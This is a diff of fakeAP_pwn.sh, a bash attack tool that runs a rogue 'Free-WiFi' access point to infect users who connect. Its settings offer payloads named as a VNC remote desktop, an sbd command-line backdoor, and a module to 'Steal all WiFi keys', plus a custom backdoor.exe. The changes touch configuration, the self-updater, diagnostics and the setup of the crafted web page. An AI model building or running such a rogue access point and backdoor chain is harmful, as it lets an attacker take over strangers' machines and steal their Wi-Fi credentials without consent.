@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#55 2010-07-27)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#56 2010-07-28)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -24,30 +24,51 @@
 # Merge; debug, diagnostics (also improve), verbose.                                           #
 #set +o verbose, set -x                                                                        #
 #---Defaults-----------------------------------------------------------------------------------#
-export            ESSID="Free-WiFi"                  # WiFi Name to use
-export    fakeAPchannel=1                            # Channel to use
-export        interface=eth0                         # The interface you use to surf the internet (Use ifconfig!)
-export    wifiInterface=wlan0                        # The interface you want to use for the fake AP (must support monitor mode!) (Use iwconfig!)
-export monitorInterface=mon0                         # The interface airmon-ng creates (Use ifconfig!)
-export           apType=airbase-ng                   # airbase-ng/hostapd. What software to use for the FakeAP
-export          payload=wkv                          # sbd/vnc/wkv/other - What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
-export     backdoorPath=/root/backdoor.exe           # ...Only used when payload is set to "other"
-export              www=/var/www/fakeAP_pwn          # The directory location to the crafted web page. No trailing slash.
-export              mtu=1500                         # 1500/1800/xxxx - If your having timing out problems, change this.
-export           apMode=transparent                  # normal/transparent/non - Normal = Doesn't force them, just sniff. Transparent = after been infected gives them internet. non = No internet access afterwards
-export      respond2All=false                        # true/false - Respond to every WiFi probe request? true = yes, false = no
-export        fakeAPmac=set                          # random/set/false - Change the FakeAP MAC Address?
-export       macAddress=00:05:7c:9a:58:3f            # XX:XX:XX:XX:XX:XX  - Use this MAC Address (...Only used when fakeAPmac is "set")
-export           extras=false                        # true/false - Runs extra programs after session is created
-export            debug=false                        # true/false - If you're having problems *** MERGE ***
-export      diagnostics=false                        # true/false - If you're having problems - creates a output file, post the results! *** MERGE ***
-export          verbose=0                            # 0/1/2      - Verbose mode. Displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands *** MERGE ***
+# The interfaces you use (Check with ifconfig!)
+interface=eth0
+wifiInterface=wlan0
+monitorInterface=mon0
 
-#---Settings-----------------------------------------------------------------------------------#
+# WiFi Name & Channel to use
+ESSID="Free-WiFi"
+fakeAPchannel=1
+
+# [airbase-ng/hostapd] What software to use for the FakeAP
+apType=airbase-ng
+
+# [normal/transparent/non] - Normal = Doesn't force them, just sniff. Transparent = after been infected gives them internet. non = No internet access afterwards
+apMode=transparent
+
+# [sbd/vnc/wkv/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
+payload=wkv
+backdoorPath=/root/backdoor.exe
+
+# The directory location to the crafted web page. No trailing slash.
+www=/var/www/fakeAP_pwn
+
+# If your having "timing out" problems, change this.
+mtu=1500
+
+# [true/false] Respond to every WiFi probe request? true = yes, false = no
+respond2All=false
+
+# [random/set/false] Change the FakeAP MAC Address?
+fakeAPmac=set
+macAddress=00:05:7c:9a:58:3f
+
+ # [true/false] Runs extra programs after session is created
+extras=false
+
+#If you're having problems, creates a output file or displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
+debug=false
+diagnostics=false
+verbose=0
+
+#---Variables----------------------------------------------------------------------------------#
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3 (Beta-#55)"
+export   version="0.3 (Beta-#56)"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
 #----Functions---------------------------------------------------------------------------------#
@@ -94,7 +115,8 @@ function cleanup() {
       iptables --zero
       echo 0 > /proc/sys/net/ipv4/ip_forward
    fi
-
+#Start network-manager (Ubuntu)
+#wicd & wicd-client
    echo -e "\e[01;36m[>]\e[00m Done! (= Have you... g0tmi1k?"
    exit 0
 }
@@ -133,15 +155,18 @@ function help() {
 
  Known issues:
    -\"Odd\" SSID
-        Airbase-ng has a few bugs... Just re run...
+        > Airbase-ng has a few bugs... Re-run the script.
+        > Try hostap
    -Can't connect
-        Airbase-ng has a few bugs... Just re run...(try with -v)
+        > Airbase-ng has a few bugs... Re-run the script. (Try with -v this time)
+        > Try hostap
    -No IP
-        Get the latest version of dhcp3-server
+        > Use latest version of dhcp3-server
    -Slow
-        Try a different MTU value.
-        Don't use a virtual machines
-        Your hardware - 802.11n doesn't work too well!
+        > Don't use a virtual machines
+        > Your hardware - 802.11n doesn't work too well!
+        > Try hostap
+        > Try a different MTU value.
 "
    exit 1
 }
@@ -149,14 +174,20 @@ function update() {
    #svn checkout http://fakeap-pwn.googlecode.com/svn/
    #svn update
    #wget http://fakeap-pwn.googlecode.com/ fakeAP_pwn.tar.gz
-   echo -e "\e[01;33m[>]\e[00m Checking for update..."
-   update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep Revision: | awk '{print }')
-   if [ '$update' != '$version' ] ; then
-      echo -e "\e[01;33m[i]\e[00m Updating..."
-      svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
-      echo -ne "\e[01;36m[>]\e[00m Updated to $update. (="
+   if test -e /usr/bin/svn ; then
+      echo -e "\e[01;33m[>]\e[00m Checking for update..."
+      update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep Revision: | awk '{print }')
+      if [ "$update" != "0.3 (Beta-#$version)" ] ; then
+         echo -e "\e[01;33m[i]\e[00m Updating..."
+         svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
+         echo -ne "\e[01;36m[>]\e[00m Updated to $update. (="
+      else
+         echo -e "\e[01;33m[i]\e[00m You are using the latest version. (="
+      fi
    else
-      echo -e "\e[01;33m[i]\e[00m You are using the latest version. (="
+         echo -e "\e[01;33m[i]\e[00m Updating..."
+         wget -nv -N http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh
+         echo -e "\e[01;33m[i]\e[00m Updated!"
    fi
    echo
    exit 2
@@ -169,7 +200,7 @@ function testAP() {
       return 2 # Couldn't detect a single AP
    fi
    for item in "${list[@]}" ; do
-      if [ "$item" == "$1" ]; then return 0; fi
+      if [ "$item" == "$1" ]; then return 0; fi # Found it!
    done
    return 3 # Couldn't find the fake AP
 }
@@ -213,7 +244,7 @@ if [ "$debug" == "true" ] ; then
    echo -e "\e[01;33m[i]\e[00m Debug Mode\e[00m"
    export xterm="xterm -hold"
 elif [ "$diagnostics" == "true" ] ; then
-   echo -e "\e[01;33m[i]\e[00m Diagnostics Mode\e[00m"
+   echo -e "\e[01;34m[i]\e[00m Diagnostics Mode\e[00m"
 fi
 
 
@@ -234,6 +265,7 @@ fi
 
 if [ "$apMode" != "non" ] ; then
    if [ "$interface" == "" ] ; then echo -e "\e[00;31m[-]\e[00m interface can't be blank" 1>&2; cleanup; fi
+   if [ "$interface" == "$wifiInterface" ] ; then echo -e "\e[00;31m[-]\e[00m interface and wifiInterface can't be the same!" 1>&2; cleanup; fi
    echo -e "\e[01;34m[i]\e[00m Testing internet connection"
    command=$( ping -I $interface -c 1 google.com > /dev/null)
    if ! $command > /dev/null 2>&1; then
@@ -312,19 +344,21 @@ $(date)
     ifconfig >> fakeAP_pwn.output
     echo "-----------------------------------------" >> fakeAP_pwn.output
     ifconfig -a >> fakeAP_pwn.output
-    echo "-Ping------------------------------------" >> fakeAP_pwn.output
-    echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 $ourIP"
-    ping -I $interface -c 4 $ourIP >> fakeAP_pwn.output
-    echo "-----------------------------------------" >> fakeAP_pwn.output
-    echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 $gatewayIP"
-    ping -I $interface -c 4 $gatewayIP >> fakeAP_pwn.output
-    echo "-----------------------------------------" >> fakeAP_pwn.output
-    echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 google.com"
-    command=$(ping -I $interface -c 4 google.com >> fakeAP_pwn.output)
-    if eval $command; then
-       echo "-->Active Internet connection" >> fakeAP_pwn.output
-    else
-       echo "-->No internet available" >> fakeAP_pwn.output
+    if [ "$apMode" != "non" ] ; then
+        echo "-Ping------------------------------------" >> fakeAP_pwn.output
+        echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 $ourIP"
+        ping -I $interface -c 4 $ourIP >> fakeAP_pwn.output
+        echo "-----------------------------------------" >> fakeAP_pwn.output
+        echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 $gatewayIP"
+        ping -I $interface -c 4 $gatewayIP >> fakeAP_pwn.output
+        echo "-----------------------------------------" >> fakeAP_pwn.output
+        echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 google.com"
+        command=$(ping -I $interface -c 4 google.com >> fakeAP_pwn.output)
+        if eval $command; then
+           echo "-->Active Internet connection" >> fakeAP_pwn.output
+        else
+           echo "-->No internet available" >> fakeAP_pwn.output
+        fi
     fi
     echo "*Commands********************************" >> fakeAP_pwn.output
 fi
@@ -342,6 +376,19 @@ if [ "$extras" == "" ] &&  [ "$extras" != "true" ] && [ "$extras" != "false" ] ;
 if [ "$debug" == "" ] && [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m debug isn't correct" 1>&2; cleanup; fi
 if [ "$diagnostics" == "" ] && [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m debug isn't correct" 1>&2; cleanup; fi
 if [ "$verbose" == "" ] && [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then echo -e "\e[00;31m[-]\e[00m verbose isn't correct" 1>&2; cleanup; fi
+
+if ! test -e "$www/index.php"; then
+   if test -d "www/"; then
+      mkdir -p $www
+      command="cp -rf www/* $www/"
+      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
+      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www/" -e "$command"
+   fi
+   if ! test -e "$www/index.php"; then
+      echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp -rf www/* $www/" 1>&2
+      cleanup
+   fi
+fi
 
 if [ "$apType" == "airbase-ng" ] ; then
    if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then
@@ -479,19 +526,6 @@ if [ "$extras" == "true" ] ; then
    fi
 fi
 
-if ! test -e "$www/index.php"; then
-   if test -d "www/"; then
-      mkdir -p $www
-      command="cp -rf www/* $www/"
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www/" -e "$command"
-   fi
-   if ! test -e "$www/index.php"; then
-      echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp -rf www/* $www/" 1>&2
-      cleanup
-   fi
-fi
-
 if [ "$apMode" != "non" ] ; then
    command="ifconfig $interface up && sleep 1" #command="ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" fails if you dont have DHCP
 #if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
@@ -549,7 +583,7 @@ if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostic
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'wicd Service'"    -e "$command" # Stopping wicd to prevent channel hopping
 command="service network-manager stop"
 if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "$command" # Stop network-manager (for Ubuntu)
+$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "$command" # Stop network-manager (Ubuntu)
 
 #----------------------------------------------------------------------------------------------#
 echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
